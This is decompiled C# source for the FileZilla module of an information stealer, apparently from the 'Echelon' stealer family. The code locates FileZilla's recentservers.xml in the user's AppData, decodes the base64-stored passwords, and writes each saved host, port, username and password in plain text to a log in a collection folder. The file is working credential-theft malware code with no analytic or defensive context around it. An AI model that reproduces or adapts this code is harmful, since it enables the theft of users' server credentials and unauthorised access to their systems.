using System;
using System.IO;
using System.Text;
using System.Xml;

namespace Echelon.Stealer.FTP
{
	// Token: 0x0200001D RID: 29
	internal class FileZilla
	{
		// Token: 0x06000072 RID: 114 RVA: 0x00008A44 File Offset: 0x00006C44
		public static void GetFileZilla(string Echelon_Dir)
		{
			if (File.Exists(FileZilla.FzPath))
			{
				Directory.CreateDirectory(Echelon_Dir + "\\FileZilla");
				FileZilla.GetDataFileZilla(FileZilla.FzPath, Echelon_Dir + "\\FileZilla\\FileZilla.log", "RecentServers", "Server");
			}
		}

		// Token: 0x06000073 RID: 115 RVA: 0x0001A970 File Offset: 0x00018B70
		public static void GetDataFileZilla(string PathFZ, string SaveFile, string RS = "RecentServers", string Serv = "Server")
		{
			try
			{
				if (File.Exists(PathFZ))
				{
					try
					{
						XmlDocument xmlDocument = new XmlDocument();
						xmlDocument.Load(PathFZ);
						foreach (object obj in ((XmlElement)xmlDocument.GetElementsByTagName(RS)[0]).GetElementsByTagName(Serv))
						{
							XmlElement xmlElement = (XmlElement)obj;
							string innerText = xmlElement.GetElementsByTagName("Host")[0].InnerText;
							string innerText2 = xmlElement.GetElementsByTagName("Port")[0].InnerText;
							string innerText3 = xmlElement.GetElementsByTagName("User")[0].InnerText;
							string @string = Encoding.UTF8.GetString(Convert.FromBase64String(xmlElement.GetElementsByTagName("Pass")[0].InnerText));
							if (string.IsNullOrEmpty(innerText) || string.IsNullOrEmpty(innerText2) || string.IsNullOrEmpty(innerText3) || string.IsNullOrEmpty(@string))
							{
								break;
							}
							FileZilla.SB.AppendLine("Host: " + innerText);
							FileZilla.SB.AppendLine("Port: " + innerText2);
							FileZilla.SB.AppendLine("User: " + innerText3);
							FileZilla.SB.AppendLine("Pass: " + @string + "\r\n");
							FileZilla.count++;
						}
						if (FileZilla.SB.Length > 0)
						{
							try
							{
								File.AppendAllText(SaveFile, FileZilla.SB.ToString());
							}
							catch
							{
							}
						}
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x0400005C RID: 92
		public static int count;

		// Token: 0x0400005D RID: 93
		private static StringBuilder SB = new StringBuilder();

		// Token: 0x0400005E RID: 94
		public static readonly string FzPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "FileZilla\\recentservers.xml");
	}
}
